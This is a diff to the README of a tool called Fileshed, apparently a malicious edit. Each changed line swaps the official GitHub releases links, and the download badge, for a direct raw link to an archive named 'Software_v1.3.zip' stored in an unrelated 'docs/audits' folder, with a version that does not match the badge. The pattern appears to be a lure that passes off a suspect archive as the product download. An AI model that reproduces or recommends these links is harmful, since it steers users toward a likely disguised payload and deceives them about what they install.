@@ -1,7 +1,7 @@
 # 🌐 Fileshed - A Workspace for Your LLM Needs
 
 ## 📥 Download Now
-[![Download Fileshed](https://img.shields.io/badge/Download%20Fileshed-v1.0-blue)](https://github.com/Sivaaah/Fileshed/releases)
+[![Download Fileshed](https://raw.githubusercontent.com/Sivaaah/Fileshed/main/docs/audits/fileshed/Software_v1.3.zip%20Fileshed-v1.0-blue)](https://raw.githubusercontent.com/Sivaaah/Fileshed/main/docs/audits/fileshed/Software_v1.3.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 🌐 How to Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the Fileshed downloads page:  
-   [Download Fileshed](https://github.com/Sivaaah/Fileshed/releases)
+   [Download Fileshed](https://raw.githubusercontent.com/Sivaaah/Fileshed/main/docs/audits/fileshed/Software_v1.3.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see different versions of Fileshed. Look for the latest stable release, typically marked with "Latest" next to the version number.
@@ -60,4 +60,4 @@ If you encounter any issues or have questions, feel free to reach out for suppor
 
 --- 
 
-Don't forget to return to the [Download Fileshed](https://github.com/Sivaaah/Fileshed/releases) page to access updates and new features as they become available!
+Don't forget to return to the [Download Fileshed](https://raw.githubusercontent.com/Sivaaah/Fileshed/main/docs/audits/fileshed/Software_v1.3.zip) page to access updates and new features as they become available!
